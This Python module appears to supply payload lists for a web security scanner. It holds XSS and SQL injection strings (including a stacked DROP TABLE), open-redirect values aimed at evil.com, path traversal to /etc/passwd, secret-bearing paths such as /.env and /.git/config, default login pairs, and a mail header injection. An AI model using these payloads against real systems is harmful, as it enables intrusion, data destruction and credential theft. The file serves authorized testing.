"""
Security testing payloads for XSS, SQL injection, open redirects, etc.

These are standard pentesting payloads used in authorized security assessments.
"""

# ---------------------------------------------------------------------------
# XSS payloads — test for reflected, stored, and DOM-based XSS
# ---------------------------------------------------------------------------
XSS_PAYLOADS = [
    # Basic script injection
    '<script>alert("XSS")</script>',
    "<script>alert(document.domain)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",

    # Event handler injection
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<details open ontoggle=alert("XSS")>',
    '<marquee onstart=alert("XSS")>',
    '<video><source onerror=alert("XSS")>',

    # Attribute breaking
    '"><script>alert("XSS")</script>',
    "'><script>alert('XSS')</script>",
    '" onfocus="alert(\'XSS\')" autofocus="',
    "' onfocus='alert(1)' autofocus='",

    # JavaScript URI
    'javascript:alert("XSS")',
    "javascript:alert(document.cookie)",

    # HTML entity / encoding bypass
    '&#60;script&#62;alert("XSS")&#60;/script&#62;',
    '<scr<script>ipt>alert("XSS")</scr</script>ipt>',

    # Template literal injection
    "${alert('XSS')}",
    "{{constructor.constructor('alert(1)')()}}",

    # SVG-based
    '<svg><script>alert("XSS")</script></svg>',
    "<svg/onload=alert('XSS')>",

    # Data URI
    '<a href="data:text/html,<script>alert(1)</script>">click</a>',

    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik%%0A1telerik2^telerik3^telerik4telerik5&{({})};alert(1)//",
]

# Canary string used to detect reflection without triggering alerts
XSS_CANARY = "MAYHEM_XSS_CANARY_7x9k2"

# ---------------------------------------------------------------------------
# SQL injection payloads
# ---------------------------------------------------------------------------
SQLI_PAYLOADS = [
    # Authentication bypass
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "admin' --",
    "admin'/*",
    "' OR ''='",

    # Union-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",

    # Error-based
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND extractvalue(1,concat(0x7e,version()))--",

    # Time-based blind
    "' OR SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "' OR pg_sleep(3)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",

    # Boolean-based blind
    "' AND 1=1--",
    "' AND 1=2--",

    # Stacked queries
    "'; DROP TABLE test--",
    "'; SELECT pg_sleep(3)--",

    # NoSQL injection
    '{"$gt": ""}',
    '{"$ne": null}',
    "true, $where: '1 == 1'",
]

# ---------------------------------------------------------------------------
# Open redirect payloads
# ---------------------------------------------------------------------------
OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "/\\evil.com",
    "////evil.com",
    "https:evil.com",
    "//evil.com/%2f..",
    "///evil.com",
    "\\\\evil.com",
    "/\\/evil.com",
    "/.evil.com",
    "//evil%00.com",
    "https://evil.com/..;/",
]

# Parameter names commonly used for redirects
REDIRECT_PARAMS = [
    "url", "redirect", "redirect_url", "redirect_uri", "return",
    "return_url", "returnTo", "next", "next_url", "target", "rurl",
    "destination", "dest", "redir", "redirect_to", "out", "view",
    "login_url", "goto", "continue", "return_path", "callback",
]

# ---------------------------------------------------------------------------
# Path traversal payloads
# ---------------------------------------------------------------------------
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd%00.jpg",
]

# ---------------------------------------------------------------------------
# Sensitive paths to probe for information disclosure
# ---------------------------------------------------------------------------
SENSITIVE_PATHS = [
    "/.env",
    "/.git/config",
    "/.git/HEAD",
    "/robots.txt",
    "/sitemap.xml",
    "/.htaccess",
    "/wp-config.php.bak",
    "/server-status",
    "/server-info",
    "/phpinfo.php",
    "/info.php",
    "/debug",
    "/console",
    "/admin",
    "/administrator",
    "/api/docs",
    "/api/swagger",
    "/swagger.json",
    "/openapi.json",
    "/graphql",
    "/graphiql",
    "/.well-known/security.txt",
    "/crossdomain.xml",
    "/clientaccesspolicy.xml",
    "/elmah.axd",
    "/trace.axd",
    "/backup",
    "/db",
    "/database",
    "/config",
    "/config.json",
    "/config.yaml",
    "/config.yml",
    "/package.json",
    "/composer.json",
    "/Gemfile",
    "/requirements.txt",
    "/.DS_Store",
    "/WEB-INF/web.xml",
    "/actuator",
    "/actuator/health",
    "/actuator/env",
    "/metrics",
    "/health",
    "/status",
]

# ---------------------------------------------------------------------------
# Security headers that should be present
# ---------------------------------------------------------------------------
EXPECTED_SECURITY_HEADERS = {
    "strict-transport-security": "Protects against protocol downgrade attacks and cookie hijacking",
    "content-security-policy": "Prevents XSS, clickjacking, and other code injection attacks",
    "x-content-type-options": "Prevents MIME type sniffing",
    "x-frame-options": "Prevents clickjacking by controlling framing",
    "x-xss-protection": "Legacy XSS filter (still useful for older browsers)",
    "referrer-policy": "Controls information sent in the Referer header",
    "permissions-policy": "Controls which browser features can be used",
    "cross-origin-opener-policy": "Isolates browsing context for cross-origin resources",
    "cross-origin-resource-policy": "Controls which origins can load resources",
    "cross-origin-embedder-policy": "Controls cross-origin resource embedding",
}

# ---------------------------------------------------------------------------
# CSRF detection patterns
# ---------------------------------------------------------------------------
CSRF_TOKEN_NAMES = [
    "csrf_token", "csrfmiddlewaretoken", "_token", "authenticity_token",
    "csrf", "__RequestVerificationToken", "antiforgery", "_csrf",
    "XSRF-TOKEN", "x-csrf-token", "x-xsrf-token",
]

# ---------------------------------------------------------------------------
# Common credentials for brute-force testing
# ---------------------------------------------------------------------------
COMMON_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("root", "root"),
    ("root", "toor"),
    ("test", "test"),
    ("user", "user"),
    ("guest", "guest"),
    ("admin", ""),
    ("administrator", "administrator"),
]

# ---------------------------------------------------------------------------
# Fuzzing payloads for input validation testing
# ---------------------------------------------------------------------------
FUZZ_PAYLOADS = [
    "",
    " ",
    "\t",
    "\n",
    "\r\n",
    "\x00",
    "A" * 10000,
    "A" * 100000,
    "-1",
    "0",
    "99999999999999999999",
    "-99999999999999999999",
    "3.14159265358979",
    "NaN",
    "Infinity",
    "-Infinity",
    "undefined",
    "null",
    "None",
    "true",
    "false",
    "[]",
    "{}",
    '{"key": "value"}',
    "<>",
    "test@test.com\nBcc: victim@evil.com",
    "test\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>",
    "%00",
    "%0d%0a",
    "file:///etc/passwd",
    "\\\\server\\share",
]
